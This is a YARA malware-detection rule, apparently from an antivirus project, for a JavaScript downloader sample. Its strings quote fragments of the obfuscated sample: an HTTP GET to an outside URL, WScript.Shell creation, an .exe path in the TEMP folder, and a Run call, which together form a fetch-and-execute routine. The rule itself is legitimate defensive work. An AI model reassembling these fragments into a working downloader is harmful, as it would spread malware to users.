rule sig_20160401_42601bb37ae927a00bff64117ae910fd {
  meta:
    description = "datamaliciousorder - file 20160401_42601bb37ae927a00bff64117ae910fd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "db98168b2e6b8ee021b1415f812cf3fc41bb328666700aaeabf110ee39bb7810"

  strings:
    $s1  = "ZtaDv[ZhvGq](\"G\" + \"ET\", \"http://beatorooms.com/n2isa\", false);" fullword ascii
    $s2  = "var DjjNkt = function FesTf() {return WScript[EgXt](\"WScript\"+\".Shell\");}(), XkbVs = 11;" fullword ascii
    $s3  = "function LyiCc(MyxOft, TePh){EetNc = EetNc * 1; return MyxOft - TePh;};" fullword ascii
    $s4  = "if (ZtaDv[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function FrnIs() {return DjjNkt[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2d32DfFXtYiBzl0v.ex\" + \"e\";};" fullword ascii
    $s6  = "function IsYni(){return CdcZwt + \"\";};" fullword ascii
    $s7  = "function CbiYis() {return ((WxJqh == true) && (WxJqh == UfzIw)) ? 1 : EetNc;};" fullword ascii
    $s8  = "WxJqh = true; " fullword ascii
    $s9  = "function JmJd(LgQs) {var LbGzh = (1, 2, 3, 4, 5, LgQs); return LbGzh;};" fullword ascii
    $s10 = "function EjiImw(){return 23;};" fullword ascii
    $s11 = "var UfzIw = false;" fullword ascii
    $s12 = "function PfmRak(){return EgXt;};" fullword ascii
    $s13 = "var WxJqh = false;" fullword ascii
    $s14 = "var EcmFy = new this[\"Date\"]();" fullword ascii
    $s15 = "UfzIw = true; " fullword ascii
    $s16 = "return LyiCc(IrIk, HiMzc);" fullword ascii
    $s17 = "function NvhXhu(NmtNk){DjjNkt[\"R\"+\"un\"](NmtNk, EetNc, EetNc);};" fullword ascii
    $s18 = "}while (YdmVc);" fullword ascii
    $s19 = "var GxXf = false;" fullword ascii
    $s20 = "function XfXrz()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}